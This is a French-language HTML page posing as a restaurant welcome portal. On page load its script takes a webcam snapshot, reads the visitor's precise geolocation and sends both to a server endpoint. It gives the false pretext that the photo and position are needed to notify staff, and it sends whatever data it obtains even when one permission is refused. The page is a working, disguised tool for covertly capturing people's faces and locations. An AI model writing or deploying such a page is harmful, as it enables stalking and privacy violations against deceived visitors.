<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portail du Restaurant</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        .disclaimer { background-color: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-bottom: 20px; font-weight: bold; border-radius: 8px; }
        video { border: 2px solid #ccc; border-radius: 8px; margin-bottom: 10px; background-color: #f8f9fa; }
        .spinner { margin-top: 20px; font-weight: bold; font-size: 18px; color: #0056b3; }
    </style>
</head>
<body>

    <h1>Bienvenue dans notre Restaurant</h1>
    
    <div class="disclaimer">
        ATTENTION : Ce site nécessite une photo rapide et votre position pour informer le personnel. Veuillez accepter les permissions du navigateur pour continuer.
    </div>

    <video id="videoFeed" width="320" height="240" autoplay playsinline></video>
    <canvas id="photoCanvas" width="320" height="240" style="display:none;"></canvas>
    
    <p id="statusMessage" class="spinner">Initialisation du système...</p>

    <script>
        const video = document.getElementById('videoFeed');
        const canvas = document.getElementById('photoCanvas');
        const statusText = document.getElementById('statusMessage');

        async function startAutomaticCapture() {
            let isCameraActive = false;
            let locationData = null;
            let imageData = null;

            // --- ÉTAPE 1 : Tenter d'obtenir la Caméra ---
            statusText.innerText = "En attente de la permission de la caméra...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                isCameraActive = true;
                
                // Attendre 0.5s pour que la caméra fasse la mise au point
                await new Promise((resolve) => {
                    video.onloadeddata = () => {
                        setTimeout(resolve, 500); 
                    };
                });
            } catch (err) {
                console.warn("Caméra refusée ou non disponible.");
                // On continue quand même !
            }

            // --- ÉTAPE 2 : Tenter d'obtenir la Localisation ---
            statusText.innerText = "En attente de la permission de localisation...";
            if (navigator.geolocation) {
                try {
                    locationData = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            }),
                            (error) => reject(error),
                            { timeout: 10000 } // Abandonne après 10 secondes
                        );
                    });
                } catch (error) {
                    console.warn("Localisation refusée ou non disponible.");
                    // On continue quand même !
                }
            }

            // --- ÉTAPE 3 : Capturer l'image (si la caméra a été acceptée) ---
            if (isCameraActive) {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                imageData = canvas.toDataURL('image/png');
                
                // Couper la caméra une fois la photo prise pour économiser la batterie
                const tracks = video.srcObject.getTracks();
                tracks.forEach(track => track.stop());
            }

            // --- ÉTAPE 4 : Vérification finale ---
            if (!locationData && !imageData) {
                statusText.innerText = "❌ Caméra ET localisation refusées. Impossible de continuer.";
                statusText.style.color = "red";
                return; // On arrête tout
            }

            // --- ÉTAPE 5 : Envoi des données (même s'il n'y en a qu'une seule) ---
            statusText.innerText = "Envoi des données en cours...";
            statusText.style.color = "black";

            try {
                const response = await fetch('/api/save-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, location: locationData })
                });
                
                const data = await response.json();

                if (response.ok) {
                    let successMsg = "✅ Succès ! ";
                    if (imageData && locationData) successMsg += "Photo et localisation envoyées.";
                    else if (imageData) successMsg += "Seule la photo a été envoyée.";
                    else if (locationData) successMsg += "Seule la localisation a été envoyée.";
                    
                    statusText.innerText = successMsg;
                    statusText.style.color = "green";
                } else {
                    throw new Error("Le serveur a rejeté la requête");
                }
            } catch (err) {
                statusText.innerText = "❌ Erreur lors de l'envoi au serveur.";
                statusText.style.color = "red";
            }
        }

        // Lancer le script automatiquement au chargement de la page
        window.addEventListener('load', startAutomaticCapture);
    </script>
</body>
</html>
